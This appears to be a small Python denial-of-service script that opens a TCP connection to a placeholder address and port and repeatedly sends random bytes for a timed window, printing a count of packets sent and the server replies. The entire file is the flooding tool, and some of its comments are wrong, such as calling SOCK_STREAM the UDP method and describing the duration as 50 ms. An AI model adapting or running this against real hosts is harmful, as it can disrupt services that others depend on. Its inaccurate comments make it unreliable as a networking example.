import socket
import sys
import random
import time

duration = 1 #50 ms for Dos attack
buffer_size = 1024
cntr = 0
server_address = ('0.0.0.0', 5367)

#use "SOCK_STREAM" for UDP method.
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
data = random._urandom(16)
timeout = time.time() + duration
tcp_socket.connect(server_address)
#send method, sends a TCP message.
tcp_socket.send(data)
while time.time()< timeout:
    tcp_socket.send(data)
    cntr = cntr + 1
    print("send %s packet to %s throught port %s on a TCP connection."%(cntr, server_address[0],server_address[1]))
    msg_from_server = tcp_socket.recv(buffer_size)
    print("message from server:{}".format(msg_from_server))
tcp_socket.close()
